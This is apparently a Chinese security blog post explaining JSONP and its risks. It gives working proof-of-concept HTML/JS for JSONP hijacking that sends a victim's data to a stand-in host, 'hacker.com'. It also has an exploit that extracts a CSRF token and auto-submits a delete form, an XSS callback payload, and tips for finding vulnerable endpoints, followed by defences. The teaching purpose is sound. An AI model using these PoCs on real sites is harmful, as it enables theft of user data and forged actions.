# jsonp介绍及其安全风险




## 简介

JSONP全称是`JSON with Padding` ，是基于JSON格式的为解决跨域请求资源而产生的解决方案。**他实现的基本原理是利用了HTML里script元素标签没有跨域限制**

**JSONP原理：**就是动态插入带有跨域url的script标签，然后调用回调函数，把我们需要的json数据作为参数传入，通过一些逻辑把数据显示在页面上。



比如通过script访问`http://www.test.com/index.html?jsonpcallback=callback`, 执行完script后，会调用callback函数，参数就是获取到的数据。

原理简介的例子：新建`callback.php`

```php
<?php
    header('Content-type: application/json');
    $callback = $_GET["callback"];
    //json数据
    $json_data = '{"user":"user1111","password":"12345678"}';
    //输出jsonp格式的数据
    echo $callback . "(" . $json_data . ")";
?>

```

新建`test.html`

```html
<!-- test.html -->

<html>
<head>
<title>Test</title>
<meta charset="utf-8">

<script type="text/javascript">
	function fun(obj){
		alert(obj["password"]);
	}
</script>
</head>

<body>
<script type="text/javascript" src="http://localhost/callback.php?callback=fun"></script>
</body>
</html>

```

访问test.html，页面会执行script，请求`http://127.0.0.1/callback.php?callback=fun`，然后将请求的内容作为参数，执行fun函数，fun函数将请求的内容alert出来。这样我们就实现了通过js操作跨域请求到的资源，绕过了同源策略。

![alert](https://image.geoer.cn/img/image-20220112223611220.png)





## JSONP劫持

> JSONP劫持类似于CSRF漏洞

JSONP使用不当也会造成很多安全问题。

对于JSONP传输数据，正常的业务是用户在B域名下请求A域名下的数据，然后进行进一步操作。

但是对A域名的请求一般都需要身份验证，Hacker可以自己构造一个页面，诱惑用户去点击（在这个页面里，我们去请求A域名资源，然后回调函数将请求到的资源发回到hacker服务器上），以此来获取这些信息。



![jsonp漏洞用过程](https://image.geoer.cn/img/image-20220112223806037.png)



POC如：test.html

```html
<html>
<head>
<title>test</title>
<meta charset="utf-8">
<script type="text/javascript">
    function fun(obj){
        var myForm = document.createElement("form");
        myForm.action="http://hacker.com/redirect.php";
        myForm.method = "GET";  
        for ( var k in obj) {  
            var myInput = document.createElement("input");  
            myInput.setAttribute("name", k);  
            myInput.setAttribute("value", obj[k]);  
            myForm.appendChild(myInput);  
        }  
        document.body.appendChild(myForm);  
        myForm.submit();  
        document.body.removeChild(myForm);
    }
</script>
</head>
<body>
<script type="text/javascript" src="http://localhost/callback.php?callback=fun"></script>
</body>
</html>

```

诱导用户去访问此html，会以用户的身份访问`http://localhost/callback.php?callback=fun`,拿到敏感数据，然后执行fun函数，将数据发送给`http://hacker.com/redirect.php`。

然后hacker只需要在redirect.php里，将数据保存下来，然后重定向到baidu.com，堪称一次完美的JSONP劫持。



## 利用JSONP绕过token防护进行csrf攻击

场景假设：服务端判断接收到的请求包，如果含有callback参数就返回JSONP格式的数据，否则返回正常页面。代码如下：test.php

```php
<!-- callback.php -->

<?php
    header('Content-type: application/json');
    //json数据
    $json_data = '{"customername1":"user1","password":"12345678"}';
    if(isset($_GET["callback"])){
        $callback = $_GET["callback"];
        //如果含有callback参数，输出jsonp格式的数据
        echo $callback . "(" . $json_data . ")";
    }else{
        echo $json_data;
    }
?>
```

对于场景，如果存在JSONP劫持劫持，我们就可以获取到页面中的内容，提取出csrf_token，然后提交表单，造成csrf漏洞。示例利用代码如下：

```html
<html>
<head>
<title>test</title>
<meta charset="utf-8">
</head>
<body>
<div id="test"></div>
<script type="text/javascript">
function test(obj){
    // 获取对象中的属性值
    var content = obj['html']
    // 正则匹配出参数值
    var token=content.match('token = "(.*?)"')[1];
    // 添加表单节点
    var parent=document.getElementById("test");
    var child=document.createElement("form");
    child.method="POST";
    child.action="http://vuln.com/del.html";
    child.id="test1"
    parent.appendChild(child);
    var parent_1=document.getElementById("test1");
    var child_1=document.createElement("input");
    child_1.type="hidden";child_1.name="token";child_1.value=token;
    var child_2=document.createElement("input");
    child_2.type="submit";
    parent_1.appendChild(child_1);
    parent_1.appendChild(child_2);
}
</script>
<script type="text/javascript" src="http://vuln.com/caozuo.html?htmlcallback=test"></script>
</body>
</html>
```

htmlcallback返回一个对象obj，以该对象作为参数传入test函数，操作对象中属性名为html的值，正则匹配出token，再加入表单，自动提交表单完成操作，用户点击该攻击页面即收到csrf攻击。





## JSONP劫持挖掘

首先需要尽可能的找到所有的接口，尤其是返回数据格式是JSONP的接口。(可以在数据包中检索关键词callback json jsonp email等，也可以加上callback参数，观察返回值是否变化)。

找到接口之后，还需要返回值包含敏感信息，并且能被不同的域的页面去请求获取(也就是是否存在refer限制,实际上，如果接口存在refer的限制，也是有可能被绕过的)





## 防御

- 限制来源refer
- 按照JSON格式标准输出（设置Content-Type : application/json; charset=utf-8），预防`http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script>`形式的xss
- 过滤callback函数名以及JSON数据输出，预防xss





## 参考文章

[jsonp介绍及其安全风险 - SAUCERMAN (saucer-man.com)](https://saucer-man.com/information_security/309.html#) 还是这位大佬写得好，小弟基本全是看的他的

[JSONP 劫持原理与挖掘方法 | K0rz3n's Blog](https://www.k0rz3n.com/2019/03/07/JSONP 劫持原理与挖掘方法/)

[JSONP绕过CSRF防护token - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5143)

[分享一个jsonp劫持造成的新浪某社区CSRF蠕虫 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html#)

[JSONP 安全攻防技术 - 知道创宇 (knownsec.com)](https://blog.knownsec.com/2015/03/jsonp_security_technic/)







---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/jsonp%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/  

